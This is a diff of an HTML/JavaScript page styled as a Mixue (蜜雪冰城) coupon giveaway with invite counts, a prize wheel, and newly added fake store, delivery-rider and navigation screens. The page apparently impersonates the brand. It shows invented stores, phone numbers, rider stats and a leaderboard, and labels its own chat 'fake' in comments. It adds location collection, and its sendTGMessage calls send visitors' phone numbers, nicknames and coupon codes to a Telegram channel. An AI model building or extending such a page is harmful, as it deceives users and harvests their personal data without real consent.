@@ -148,7 +148,7 @@
       100% { transform:translateX(calc(-100vw - 140%)); } 
     }
 
-    .input-box { position:relative; margin-bottom:20px; }
+    .input-box { position:relative; margin-bottom:16px; }
     input { width:100%; height:56px; padding:0 24px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
     input:focus { outline:none; border-color:var(--mixue-red); box-shadow:0 0 0 6px rgba(230,57,70,0.1); transform:translateY(-2px); }
     input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
@@ -160,20 +160,23 @@
       background: #f0f2f5;
       border-radius: 27px;
       position: relative;
-      margin: 24px 0 32px;
+      margin: 0 0 16px 0;
       overflow: hidden;
       border: 1px solid #e8eaed;
       box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
       opacity: 0;
-      transform: translateY(12px);
+      max-height: 0;
+      transform: translateY(-10px);
       transition: all 0.4s ease;
       pointer-events: none;
     }
 
     .verify-slider.show {
       opacity: 1;
+      max-height: 54px;
       transform: translateY(0);
       pointer-events: auto;
+      margin: 0 0 16px 0;
     }
 
     .verify-bg {
@@ -801,6 +804,515 @@
       border-bottom: 1px solid #eee;
     }
     .history-item:last-child { border-bottom: none; }
+
+    /* 新增：门店相关样式 */
+    .store-section {
+      background: white;
+      border-radius: var(--radius-md);
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+    .store-section h4 {
+      color: var(--mixue-red);
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 1.1rem;
+    }
+    .store-list {
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .store-item {
+      display: flex;
+      align-items: flex-start;
+      padding: 12px;
+      border-bottom: 1px solid #f0f0f0;
+      cursor: pointer;
+      transition: all 0.3s;
+      border-radius: 8px;
+      margin-bottom: 8px;
+    }
+    .store-item:hover {
+      background: rgba(230,57,70,0.05);
+      transform: translateX(5px);
+    }
+    .store-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+    }
+    .store-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    .store-info {
+      flex: 1;
+      text-align: left;
+    }
+    .store-name {
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .store-address {
+      font-size: 0.85rem;
+      color: #666;
+      margin-bottom: 4px;
+    }
+    .store-distance {
+      font-size: 0.8rem;
+      color: var(--mixue-red);
+      font-weight: 600;
+    }
+    .store-actions {
+      display: flex;
+      gap: 8px;
+      margin-top: 8px;
+    }
+    .store-btn {
+      padding: 6px 12px;
+      border-radius: 20px;
+      border: none;
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .nav-btn {
+      background: linear-gradient(135deg, #1890ff, #36cfc9);
+      color: white;
+    }
+    .delivery-btn {
+      background: linear-gradient(135deg, #52c41a, #73d13d);
+      color: white;
+    }
+    .store-btn:active {
+      transform: scale(0.95);
+    }
+    .location-loading {
+      text-align: center;
+      padding: 20px;
+      color: #999;
+    }
+    .location-error {
+      text-align: center;
+      padding: 20px;
+      color: #ff4d4f;
+    }
+    .refresh-location-btn {
+      background: var(--mixue-red);
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 20px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    /* 骑手配送弹窗 */
+    .rider-modal .modal-content {
+      max-width: 360px;
+    }
+    .rider-info {
+      background: linear-gradient(135deg, #f6ffed, #d9f7be);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 15px 0;
+      text-align: left;
+    }
+    .rider-avatar {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #52c41a, #73d13d);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      margin: 0 auto 10px;
+    }
+    .rider-name {
+      font-weight: 700;
+      color: #333;
+      text-align: center;
+      margin-bottom: 5px;
+    }
+    .rider-id {
+      text-align: center;
+      color: #666;
+      font-size: 0.85rem;
+      margin-bottom: 10px;
+    }
+    .rider-stats {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 10px;
+    }
+    .rider-stat {
+      text-align: center;
+    }
+    .rider-stat-value {
+      font-weight: 700;
+      color: var(--mixue-red);
+      font-size: 1.1rem;
+    }
+    .rider-stat-label {
+      font-size: 0.75rem;
+      color: #666;
+    }
+    .delivery-progress {
+      margin: 20px 0;
+    }
+    .progress-line {
+      display: flex;
+      justify-content: space-between;
+      position: relative;
+      margin-bottom: 10px;
+    }
+    .progress-line::before {
+      content: '';
+      position: absolute;
+      top: 15px;
+      left: 10%;
+      right: 10%;
+      height: 2px;
+      background: #e8e8e8;
+      z-index: 0;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 1;
+    }
+    .step-dot {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: #e8e8e8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      margin-bottom: 5px;
+      transition: all 0.3s;
+    }
+    .step-dot.active {
+      background: var(--mixue-red);
+      color: white;
+      animation: pulse 1.5s infinite;
+    }
+    .step-dot.completed {
+      background: #52c41a;
+      color: white;
+    }
+    .step-label {
+      font-size: 0.75rem;
+      color: #666;
+    }
+    .delivery-map {
+      height: 150px;
+      background: linear-gradient(135deg, #e6f7ff, #bae7ff);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 15px 0;
+      position: relative;
+      overflow: hidden;
+    }
+    .map-route {
+      position: absolute;
+      width: 80%;
+      height: 4px;
+      background: #1890ff;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    .map-route::before, .map-route::after {
+      content: '📍';
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+    }
+    .map-route::before {
+      left: -10px;
+    }
+    .map-route::after {
+      right: -10px;
+    }
+    .rider-marker {
+      position: absolute;
+      font-size: 30px;
+      animation: riderMove 3s infinite;
+    }
+    @keyframes riderMove {
+      0%, 100% { left: 10%; }
+      50% { left: 70%; }
+    }
+    .eta-box {
+      background: var(--mixue-yellow);
+      color: var(--mixue-dark);
+      padding: 10px;
+      border-radius: 8px;
+      font-weight: 700;
+      margin-top: 10px;
+    }
+
+    /* 导航弹窗 */
+    .nav-modal .modal-content {
+      max-width: 380px;
+      padding: 0;
+      overflow: hidden;
+    }
+    .nav-header {
+      background: linear-gradient(135deg, #1890ff, #36cfc9);
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    .nav-map-container {
+      height: 200px;
+      background: #f0f2f5;
+      position: relative;
+    }
+    .fake-map {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      background: linear-gradient(135deg, #e6f7ff 0%, #bae7ff 50%, #91d5ff 100%);
+      overflow: hidden;
+    }
+    .fake-road {
+      position: absolute;
+      background: white;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .fake-road-h {
+      height: 20px;
+      width: 100%;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    .fake-road-v {
+      width: 20px;
+      height: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .nav-marker {
+      position: absolute;
+      font-size: 24px;
+      z-index: 10;
+    }
+    .nav-start {
+      top: 40%;
+      left: 20%;
+    }
+    .nav-end {
+      top: 60%;
+      right: 20%;
+    }
+    .nav-route-line {
+      position: absolute;
+      top: 50%;
+      left: 20%;
+      right: 20%;
+      height: 4px;
+      background: #1890ff;
+      transform: translateY(-50%);
+      z-index: 5;
+    }
+    .nav-route-line::after {
+      content: '▶';
+      position: absolute;
+      right: -10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #1890ff;
+      font-size: 16px;
+      animation: arrowMove 1s infinite;
+    }
+    @keyframes arrowMove {
+      0%, 100% { transform: translateY(-50%) translateX(0); }
+      50% { transform: translateY(-50%) translateX(5px); }
+    }
+    .nav-info {
+      padding: 20px;
+    }
+    .nav-distance {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+    .nav-info-item {
+      text-align: center;
+    }
+    .nav-info-value {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #1890ff;
+    }
+    .nav-info-label {
+      font-size: 0.85rem;
+      color: #666;
+    }
+    .nav-actions {
+      display: flex;
+      gap: 10px;
+    }
+    .nav-action-btn {
+      flex: 1;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .start-nav-btn {
+      background: linear-gradient(135deg, #1890ff, #36cfc9);
+      color: white;
+    }
+    .open-map-btn {
+      background: #f0f2f5;
+      color: #333;
+    }
+    .nav-action-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* 配送方式选择 */
+    .delivery-options {
+      display: flex;
+      gap: 10px;
+      margin: 15px 0;
+    }
+    .delivery-option {
+      flex: 1;
+      padding: 15px;
+      border: 2px solid #e8e8e8;
+      border-radius: 12px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .delivery-option:hover {
+      border-color: var(--mixue-red);
+      background: rgba(230,57,70,0.05);
+    }
+    .delivery-option.selected {
+      border-color: var(--mixue-red);
+      background: rgba(230,57,70,0.1);
+    }
+    .delivery-option-icon {
+      font-size: 2rem;
+      margin-bottom: 5px;
+    }
+    .delivery-option-title {
+      font-weight: 700;
+      color: #333;
+      font-size: 0.9rem;
+    }
+    .delivery-option-desc {
+      font-size: 0.75rem;
+      color: #666;
+      margin-top: 3px;
+    }
+
+    /* 页面切换标签 */
+    .page-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+      background: white;
+      padding: 5px;
+      border-radius: 30px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .page-tab {
+      flex: 1;
+      padding: 10px;
+      border-radius: 25px;
+      border: none;
+      background: transparent;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      color: #666;
+    }
+    .page-tab.active {
+      background: var(--mixue-red);
+      color: white;
+    }
+
+    /* 雪王客服悬浮按钮 - 全程显示 */
+    .chat-float-btn {
+      position: fixed;
+      bottom: 30px;
+      right: 20px;
+      width: 60px;
+      height: 60px;
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 28px;
+      cursor: pointer;
+      box-shadow: 0 4px 20px rgba(230,57,70,0.4);
+      z-index: 9999;
+      transition: all 0.3s;
+      border: 3px solid white;
+      animation: floatBtnPulse 2s infinite;
+    }
+    .chat-float-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 30px rgba(230,57,70,0.6);
+    }
+    .chat-float-btn:active {
+      transform: scale(0.95);
+    }
+    @keyframes floatBtnPulse {
+      0%, 100% { box-shadow: 0 4px 20px rgba(230,57,70,0.4); }
+      50% { box-shadow: 0 4px 30px rgba(230,57,70,0.7); }
+    }
+    .chat-float-btn .notification-badge {
+      position: absolute;
+      top: -5px;
+      right: -5px;
+      width: 20px;
+      height: 20px;
+      background: #ff4d4f;
+      border-radius: 50%;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      animation: badgePulse 1.5s infinite;
+    }
+    @keyframes badgePulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+    }
   </style>
 </head>
 <body>
@@ -812,6 +1324,12 @@
 
 <!-- 键盘提示 -->
 <div class="keyboard-hint" id="keyboardHint">按空格键抽奖 | ESC关闭</div>
+
+<!-- 雪王客服悬浮按钮 - 全程显示 -->
+<div class="chat-float-btn" id="chatFloatBtn" onclick="openChat()">
+  💬
+  <div class="notification-badge" id="chatBadge">1</div>
+</div>
 
 <!-- 启动加载画面 -->
 <div class="splash-screen" id="splashScreen">
@@ -899,75 +1417,144 @@
   </div>
   
   <div class="content">
-    <!-- 限时奖励 -->
-    <div class="countdown-bonus" id="countdownBonus">
-      <span class="label">⏰ 限时翻倍奖励</span>
-      <span class="timer" id="bonusTimer">05:00</span>
+    <!-- 页面切换标签 -->
+    <div class="page-tabs">
+      <button class="page-tab active" onclick="switchTab('invite')">邀请好友</button>
+      <button class="page-tab" onclick="switchTab('store')">附近门店</button>
+      <button class="page-tab" onclick="switchTab('delivery')">外卖配送</button>
     </div>
 
-    <!-- 排行榜 -->
-    <div class="leaderboard">
-      <h4>🏆 邀请排行榜</h4>
-      <div class="leaderboard-item">
-        <div class="leaderboard-rank rank-1">1</div>
-        <div class="leaderboard-name">李**</div>
-        <div class="leaderboard-count">128人</div>
+    <!-- 邀请内容 -->
+    <div id="inviteTabContent">
+      <!-- 限时奖励 -->
+      <div class="countdown-bonus" id="countdownBonus">
+        <span class="label">⏰ 限时翻倍奖励</span>
+        <span class="timer" id="bonusTimer">05:00</span>
       </div>
-      <div class="leaderboard-item">
-        <div class="leaderboard-rank rank-2">2</div>
-        <div class="leaderboard-name">王**</div>
-        <div class="leaderboard-count">96人</div>
+
+      <!-- 排行榜 -->
+      <div class="leaderboard">
+        <h4>🏆 邀请排行榜</h4>
+        <div class="leaderboard-item">
+          <div class="leaderboard-rank rank-1">1</div>
+          <div class="leaderboard-name">李**</div>
+          <div class="leaderboard-count">128人</div>
+        </div>
+        <div class="leaderboard-item">
+          <div class="leaderboard-rank rank-2">2</div>
+          <div class="leaderboard-name">王**</div>
+          <div class="leaderboard-count">96人</div>
+        </div>
+        <div class="leaderboard-item">
+          <div class="leaderboard-rank rank-3">3</div>
+          <div class="leaderboard-name">张**</div>
+          <div class="leaderboard-count">85人</div>
+        </div>
       </div>
-      <div class="leaderboard-item">
-        <div class="leaderboard-rank rank-3">3</div>
-        <div class="leaderboard-name">张**</div>
-        <div class="leaderboard-count">85人</div>
+
+      <div class="invite-stats">
+        <div class="bonus-tag" id="bonusTag" style="display: none;">翻倍中</div>
+        <div class="invite-count" id="inviteCount">0</div>
+        <div class="invite-label">位好友已助力</div>
+        <div class="chance-count" id="chanceCount">剩余抽奖次数：0</div>
+      </div>
+
+      <!-- 转盘 -->
+      <div class="wheel-container" id="wheelContainer" style="display: none;">
+        <div class="wheel" id="wheel">
+          <div class="wheel-item"><span class="emoji">🎁</span><span class="text">柠檬茶券</span></div>
+          <div class="wheel-item"><span class="emoji">😢</span><span class="text">谢谢惠顾</span></div>
+          <div class="wheel-item"><span class="emoji">🍦</span><span class="text">冰淇淋券</span></div>
+          <div class="wheel-item"><span class="emoji">😭</span><span class="text">再接再厉</span></div>
+          <div class="wheel-item"><span class="emoji">🧋</span><span class="text">奶茶券</span></div>
+          <div class="wheel-item"><span class="emoji">🤔</span><span class="text">差一点</span></div>
+          <div class="wheel-item"><span class="emoji">🎊</span><span class="text">神秘大奖</span></div>
+          <div class="wheel-item"><span class="emoji">😅</span><span class="text">下次再来</span></div>
+        </div>
+        <div class="wheel-pointer">👆</div>
+      </div>
+
+      <!-- 兑换邀请码区域 -->
+      <div class="redeem-box">
+        <div class="input-box" style="flex:1; margin-bottom:0;">
+          <input type="text" id="inviteCodeInput" placeholder="请输入好友邀请码" maxlength="6" />
+        </div>
+        <button class="redeem-btn" id="redeemBtn">兑换</button>
+      </div>
+
+      <!-- 签到按钮 -->
+      <button class="btn check-in-btn" id="checkInBtn">📅 每日签到 (+1次机会)</button>
+
+      <button class="btn invite-more-btn" id="inviteMoreBtn">邀请好友</button>
+      <button class="btn wheel-btn hidden" id="wheelBtn">🎰 开始抽奖</button>
+
+      <div class="invite-rules">
+        <h4>🎮 活动规则</h4>
+        <li>每邀请1位好友获得随机抽奖次数（1-5次）</li>
+        <li>限时翻倍期间邀请奖励翻倍</li>
+        <li>邀请满3位好友必得柠檬茶券码</li>
+        <li>每日签到可获得额外抽奖机会</li>
+        <li>活动最终解释权归蜜雪冰城所有</li>
       </div>
     </div>
 
-    <div class="invite-stats">
-      <div class="bonus-tag" id="bonusTag" style="display: none;">翻倍中</div>
-      <div class="invite-count" id="inviteCount">0</div>
-      <div class="invite-label">位好友已助力</div>
-      <div class="chance-count" id="chanceCount">剩余抽奖次数：0</div>
-    </div>
-
-    <!-- 转盘 -->
-    <div class="wheel-container" id="wheelContainer" style="display: none;">
-      <div class="wheel" id="wheel">
-        <div class="wheel-item"><span class="emoji">🎁</span><span class="text">柠檬茶券</span></div>
-        <div class="wheel-item"><span class="emoji">😢</span><span class="text">谢谢惠顾</span></div>
-        <div class="wheel-item"><span class="emoji">🍦</span><span class="text">冰淇淋券</span></div>
-        <div class="wheel-item"><span class="emoji">😭</span><span class="text">再接再厉</span></div>
-        <div class="wheel-item"><span class="emoji">🧋</span><span class="text">奶茶券</span></div>
-        <div class="wheel-item"><span class="emoji">🤔</span><span class="text">差一点</span></div>
-        <div class="wheel-item"><span class="emoji">🎊</span><span class="text">神秘大奖</span></div>
-        <div class="wheel-item"><span class="emoji">😅</span><span class="text">下次再来</span></div>
+    <!-- 附近门店内容 -->
+    <div id="storeTabContent" style="display: none;">
+      <div class="store-section">
+        <h4>📍 附近门店（虚拟）</h4>
+        <div id="storeListContainer">
+          <div class="location-loading">
+            <div>正在定位中...</div>
+            <div style="font-size: 0.85rem; margin-top: 10px;">请允许获取位置权限</div>
+          </div>
+        </div>
       </div>
-      <div class="wheel-pointer">👆</div>
-    </div>
-
-    <!-- 兑换邀请码区域 -->
-    <div class="redeem-box">
-      <div class="input-box" style="flex:1; margin-bottom:0;">
-        <input type="text" id="inviteCodeInput" placeholder="请输入好友邀请码" maxlength="6" />
+      <div class="store-section">
+        <h4>🎯 门店服务</h4>
+        <div class="delivery-options">
+          <div class="delivery-option" onclick="selectDeliveryType('self')">
+            <div class="delivery-option-icon">🚶</div>
+            <div class="delivery-option-title">到店自取</div>
+            <div class="delivery-option-desc">免排队，立取立走</div>
+          </div>
+          <div class="delivery-option" onclick="selectDeliveryType('delivery')">
+            <div class="delivery-option-icon">🛵</div>
+            <div class="delivery-option-title">外卖配送</div>
+            <div class="delivery-option-desc">骑手30分钟送达</div>
+          </div>
+        </div>
       </div>
-      <button class="redeem-btn" id="redeemBtn">兑换</button>
     </div>
 
-    <!-- 签到按钮 -->
-    <button class="btn check-in-btn" id="checkInBtn">📅 每日签到 (+1次机会)</button>
-
-    <button class="btn invite-more-btn" id="inviteMoreBtn">邀请好友</button>
-    <button class="btn wheel-btn hidden" id="wheelBtn">🎰 开始抽奖</button>
-
-    <div class="invite-rules">
-      <h4>🎮 活动规则</h4>
-      <li>每邀请1位好友获得随机抽奖次数（1-5次）</li>
-      <li>限时翻倍期间邀请奖励翻倍</li>
-      <li>邀请满3位好友必得柠檬茶券码</li>
-      <li>每日签到可获得额外抽奖机会</li>
-      <li>活动最终解释权归蜜雪冰城所有</li>
+    <!-- 外卖配送内容 -->
+    <div id="deliveryTabContent" style="display: none;">
+      <div class="store-section">
+        <h4>🛵 配送服务</h4>
+        <div class="delivery-options">
+          <div class="delivery-option selected">
+            <div class="delivery-option-icon">⚡</div>
+            <div class="delivery-option-title">极速达</div>
+            <div class="delivery-option-desc">30分钟内送达</div>
+          </div>
+          <div class="delivery-option">
+            <div class="delivery-option-icon">🕐</div>
+            <div class="delivery-option-title">预约送</div>
+            <div class="delivery-option-desc">指定时间送达</div>
+          </div>
+        </div>
+        <button class="btn" onclick="callRider()" style="margin-top: 15px; background: linear-gradient(135deg, #52c41a, #73d13d);">
+          🛵 呼叫骑手配送
+        </button>
+      </div>
+      <div class="store-section">
+        <h4>📋 配送说明</h4>
+        <div class="invite-rules" style="margin-top: 0;">
+          <li>配送范围：门店周边3公里</li>
+          <li>配送费：活动期间免配送费</li>
+          <li>预计送达：30-45分钟</li>
+          <li>支持实时追踪骑手位置</li>
+        </div>
+      </div>
     </div>
   </div>
 </div>
@@ -983,6 +1570,9 @@
     <button class="btn copy-btn" id="copyCouponBtn">一键复制券码</button>
     <button class="btn share-btn" id="shareBtn">分享给好友</button>
     <button class="btn history-btn" id="viewHistoryBtn">查看我的券码历史</button>
+    <button class="btn" onclick="showNearbyStores()" style="margin-top: 10px; background: linear-gradient(135deg, #1890ff, #36cfc9);">
+      📍 查看附近门店
+    </button>
   </div>
 </div>
 
@@ -1013,8 +1603,8 @@
   </div>
 </div>
 
-<!-- 假雪王客服聊天窗口 -->
-<div class="modal" id="chatModal" style="display:none; z-index:100001;">
+<!-- 雪王客服聊天窗口 -->
+<div class="modal" id="chatModal" style="z-index:100001;">
   <div class="modal-content" style="padding:0; max-width:380px; height:520px; display:flex; flex-direction:column; overflow:hidden;">
     <div style="background: linear-gradient(135deg, var(--mixue-red), #C92A39); color:white; padding:14px; text-align:center; position:relative;">
       <img src="https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046994-imagetourl.cloud-1770456904865-vyi8ak.jpg" 
@@ -1033,6 +1623,99 @@
       <input type="text" id="chatInput" placeholder="说点啥吧～（比如：券码怎么用？）" 
              style="flex:1; height:44px; padding:0 16px; border:1px solid #ddd; border-radius:22px; font-size:1rem;">
       <button id="sendChatBtn" style="width:60px; height:44px; background:var(--mixue-red); color:white; border:none; border-radius:22px; font-weight:bold; cursor:pointer;">发送</button>
+    </div>
+  </div>
+</div>
+
+<!-- 骑手配送弹窗 -->
+<div class="modal rider-modal" id="riderModal">
+  <div class="modal-content">
+    <h2>🛵 骑手已接单</h2>
+    <div class="rider-info">
+      <div class="rider-avatar">👨‍🍳</div>
+      <div class="rider-name" id="riderName">王师傅</div>
+      <div class="rider-id">骑手编号：MX-R-2026-8888</div>
+      <div class="rider-stats">
+        <div class="rider-stat">
+          <div class="rider-stat-value">4.9</div>
+          <div class="rider-stat-label">评分</div>
+        </div>
+        <div class="rider-stat">
+          <div class="rider-stat-value">1286</div>
+          <div class="rider-stat-label">单量</div>
+        </div>
+        <div class="rider-stat">
+          <div class="rider-stat-value">98%</div>
+          <div class="rider-stat-label">准时率</div>
+        </div>
+      </div>
+    </div>
+    <div class="delivery-map">
+      <div class="map-route"></div>
+      <div class="rider-marker">🛵</div>
+    </div>
+    <div class="delivery-progress">
+      <div class="progress-line">
+        <div class="progress-step">
+          <div class="step-dot completed">✓</div>
+          <div class="step-label">已接单</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-dot active">📦</div>
+          <div class="step-label">取货中</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-dot">🛵</div>
+          <div class="step-label">配送中</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-dot">🏠</div>
+          <div class="step-label">已送达</div>
+        </div>
+      </div>
+    </div>
+    <div class="eta-box">
+      预计送达时间：<span id="etaTime">12:30</span>（约25分钟）
+    </div>
+    <button class="btn" onclick="closeRiderModal()" style="margin-top: 15px;">查看实时位置</button>
+  </div>
+</div>
+
+<!-- 导航弹窗 -->
+<div class="modal nav-modal" id="navModal">
+  <div class="modal-content">
+    <div class="nav-header">
+      <h3 style="margin: 0;">🧭 导航到门店</h3>
+      <p style="margin: 5px 0 0; opacity: 0.9; font-size: 0.9rem;" id="navStoreName">蜜雪冰城（中心店）</p>
+    </div>
+    <div class="nav-map-container">
+      <div class="fake-map">
+        <div class="fake-road fake-road-h"></div>
+        <div class="fake-road fake-road-v"></div>
+        <div class="nav-route-line"></div>
+        <div class="nav-marker nav-start">📍</div>
+        <div class="nav-marker nav-end">🏪</div>
+      </div>
+    </div>
+    <div class="nav-info">
+      <div class="nav-distance">
+        <div class="nav-info-item">
+          <div class="nav-info-value" id="navDistance">1.2</div>
+          <div class="nav-info-label">公里</div>
+        </div>
+        <div class="nav-info-item">
+          <div class="nav-info-value" id="navTime">15</div>
+          <div class="nav-info-label">分钟</div>
+        </div>
+        <div class="nav-info-item">
+          <div class="nav-info-value" id="navTraffic">畅通</div>
+          <div class="nav-info-label">路况</div>
+        </div>
+      </div>
+      <div class="nav-actions">
+        <button class="nav-action-btn start-nav-btn" onclick="startNavigation()">开始导航</button>
+        <button class="nav-action-btn open-map-btn" onclick="openExternalMap()">打开地图APP</button>
+      </div>
     </div>
   </div>
 </div>
@@ -1084,6 +1767,10 @@ let isSending = false;
 let isPolling = false;
 let isSpinning = false;
 let bonusActive = true;
+let currentTab = 'invite';
+let selectedStore = null;
+let userLocation = null;
+let chatOpened = false;
 
 // 邀请系统状态
 let inviteState = {
@@ -1095,6 +1782,19 @@ let inviteState = {
   checkedIn: false,
   lastCheckIn: null
 };
+
+// 虚拟门店数据
+const virtualStores = [
+  { id: 1, name: '蜜雪冰城（中心广场店）', address: '中心广场商业街A区108号', distance: 0.8, lat: 39.9042, lng: 116.4074, rating: 4.8, businessHours: '09:00-23:00', phone: '010-88886666' },
+  { id: 2, name: '蜜雪冰城（万达广场店）', address: '万达广场3楼美食区305号', distance: 1.5, lat: 39.9123, lng: 116.4156, rating: 4.9, businessHours: '10:00-22:00', phone: '010-88887777' },
+  { id: 3, name: '蜜雪冰城（大学路店）', address: '大学路小吃街88号', distance: 2.3, lat: 39.8987, lng: 116.3987, rating: 4.7, businessHours: '08:30-24:00', phone: '010-88888888' },
+  { id: 4, name: '蜜雪冰城（地铁站店）', address: '地铁1号线朝阳门站B出口旁', distance: 3.1, lat: 39.9201, lng: 116.4289, rating: 4.6, businessHours: '07:00-23:30', phone: '010-88889999' },
+  { id: 5, name: '蜜雪冰城（社区店）', address: '阳光花园小区北门底商12号', distance: 4.2, lat: 39.8856, lng: 116.3856, rating: 4.9, businessHours: '09:00-22:00', phone: '010-88880000' }
+];
+
+// 骑手数据
+const riderNames = ['王师傅', '李师傅', '张师傅', '刘师傅', '陈师傅', '杨师傅'];
+const riderAvatars = ['👨‍🍳', '👩‍🍳', '🧑‍🍳', '👨‍🦱', '👩‍🦱', '🧑‍🦱'];
 
 // 从本地存储恢复数据
 function loadFromStorage() {
@@ -1191,7 +1891,18 @@ const els = {
   chatModal: document.getElementById('chatModal'),
   chatMessages: document.getElementById('chatMessages'),
   chatInput: document.getElementById('chatInput'),
-  sendChatBtn: document.getElementById('sendChatBtn')
+  sendChatBtn: document.getElementById('sendChatBtn'),
+  chatFloatBtn: document.getElementById('chatFloatBtn'),
+  chatBadge: document.getElementById('chatBadge'),
+  storeListContainer: document.getElementById('storeListContainer'),
+  riderModal: document.getElementById('riderModal'),
+  navModal: document.getElementById('navModal'),
+  navStoreName: document.getElementById('navStoreName'),
+  navDistance: document.getElementById('navDistance'),
+  navTime: document.getElementById('navTime'),
+  navTraffic: document.getElementById('navTraffic'),
+  etaTime: document.getElementById('etaTime'),
+  riderName: document.getElementById('riderName')
 };
 
 function showToast(msg, duration = 2800) {
@@ -1269,11 +1980,13 @@ function showAgreement(type) {
 1. 收集的信息
 - 手机号、昵称（您主动提供）
 - 设备信息、IP地址、访问时间
+- 位置信息（用于查找附近门店）
 
 2. 使用目的
 - 身份验证与福利发放
 - 防刷、防作弊
-- 服务优化
+- 服务优化与门店推荐
+- 配送服务匹配
 
 3. 信息共享
 仅在必要时与蜜雪冰城官方合作门店共享券码信息用于核销，不会出售您的个人信息。
@@ -1291,6 +2004,7 @@ function showAgreement(type) {
 - 每手机号限领1次
 - 禁止使用脚本、接码平台
 - 券码需在有效期内到店核销
+- 配送服务仅限门店周边3公里范围
 
 3. 违规处理
 发现作弊行为将取消资格并永久限制参与。
@@ -1483,6 +2197,9 @@ function showInvitePage(phone, nickname) {
     setTimeout(() => els.keyboardHint.classList.add('show'), 1000);
     setTimeout(() => els.keyboardHint.classList.remove('show'), 5000);
   }
+  
+  // 模拟获取位置
+  simulateLocation();
   
   sendTGMessage(`【进入邀请页面】\n手机号：${phone}\n昵称：${nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
 }
@@ -1770,8 +2487,8 @@ function handleWheelResult(index) {
       
       sendTGMessage(`【🎉 最终获奖】\n手机号：${inviteState.currentPhone}\n券码：${newCode}\n获奖类型：${result.name}\n时间：${new Date().toLocaleString('zh-CN')}`);
       
-      // 成功后弹出假客服聊天
-      setTimeout(openChat, 1200);
+      // 隐藏客服按钮红点
+      if (els.chatBadge) els.chatBadge.style.display = 'none';
     }, 500);
   } else {
     showToast(`${result.emoji} ${result.name}！${inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
@@ -1847,6 +2564,8 @@ function initKeyboardShortcuts() {
       if (els.agreementModal) els.agreementModal.classList.remove('show');
       if (els.historyModal) els.historyModal.classList.remove('show');
       if (els.chatModal) els.chatModal.classList.remove('show');
+      if (els.riderModal) els.riderModal.classList.remove('show');
+      if (els.navModal) els.navModal.classList.remove('show');
     }
   });
 }
@@ -1905,10 +2624,10 @@ function showCouponHistory() {
 
 // 假雪王客服聊天
 const customerReplies = [
-  "嘿嘿～我是雪王小冰呀！券码已经发你手机短信啦～记得去店里直接说‘我要兑换柠檬茶券’就行！",
+  "嘿嘿～我是雪王小冰呀！有什么可以帮你的吗？😊",
   "大杯柠檬茶超酸爽的！夏天必备懂？？？快去喝吧～别客气！",
-  "欸欸欸～这么快就领到了？牛哇！要不要叫上朋友一起来？多邀几个人我给你偷偷加次数哦～😏",
-  "券码是MX开头的那串对吧？到店出示就行～别截图丢了哈，过期我可不负责哟～(｡•́︿•̀｡)",
+  "欸欸欸～活动参与得怎么样啦？需要我帮忙吗？",
+  "券码是MX开头的那串对吧？到店出示就行～别截图丢了哈！",
